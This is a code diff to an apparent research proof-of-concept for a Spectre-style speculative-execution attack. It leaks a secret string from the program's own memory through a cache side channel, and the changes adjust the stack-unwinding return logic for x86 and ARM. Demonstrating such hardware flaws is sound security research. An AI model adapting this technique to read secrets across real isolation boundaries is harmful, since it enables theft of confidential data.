@@ -36,7 +36,15 @@ const char *private_data = "It's a s3kr3t!!!";
 size_t current_offset;
 const std::array<BigByte, 256> *oracle_ptr;
 
-// Call a "UnwindStackAndSlowlyReturn.." function which unwinds the stack
+#ifdef __aarch64__
+// On ARM we need a local function to return to because of local vs. global
+// relocation mismatches.
+void return_handler() {
+  JumpToAfterSpeculation();
+}
+#endif
+
+// Call a "UnwindStackAndSlowlyReturnTo" function which unwinds the stack
 // jumping back to the "afterspeculation" label in the "leak_byte" function
 // never executing the code that follows.
 #ifdef _MSC_VER
@@ -49,12 +57,14 @@ __attribute__((noinline))
 static void speculation() {
 #if defined(__i386__) || defined(__x86_64__) || defined(_M_X64) || \
     defined(_M_IX86)
-  UnwindStackAndSlowlyReturnTo(afterspeculation); // Never returns back here.
+  const void *return_address = afterspeculation;
 #elif defined(__aarch64__)
-  UnwindStackAndSlowlyReturn(); // Never returns back here.
+  const void *return_address = reinterpret_cast<const void *>(return_handler);
 #else
-#  error Unsupported architecture.
+#  error Unsupported CPU.
 #endif
+
+  UnwindStackAndSlowlyReturnTo(return_address); // Never returns back here.
 
   // Everything that follows this is architecturally dead code. Never reached.
   // However, the first two statements are executed speculatively.
@@ -76,8 +86,7 @@ static char leak_byte() {
   CacheSideChannel sidechannel;
   oracle_ptr = &sidechannel.GetOracle(); // Save the pointer to global storage.
 
-  // Using volatile variables in order to avoid register spoiling.
-  for (volatile int run = 0;; ++run) {
+  for (int run = 0;; ++run) {
     sidechannel.FlushOracle();
 
 #ifdef __aarch64__
@@ -90,14 +99,16 @@ static char leak_byte() {
     // accesses the oracle and ends up on the afterspeculation label below.
     speculation();
 
-    // Inlines the afterspeculation label.
-    afterspeculate();
+    // Return target for the UnwindStackAndSlowlyReturnTo function.
+    asm volatile(
+        "_afterspeculation:\n" // For MacOS.
+        "afterspeculation:\n"); // For Linux.
 
 #ifdef __aarch64__
     RestoreCalleeSavedRegs();
 #endif
 
-    volatile std::pair<bool, char> result =
+    std::pair<bool, char> result =
         sidechannel.AddHitAndRecomputeScores();
 
     if (result.first) {
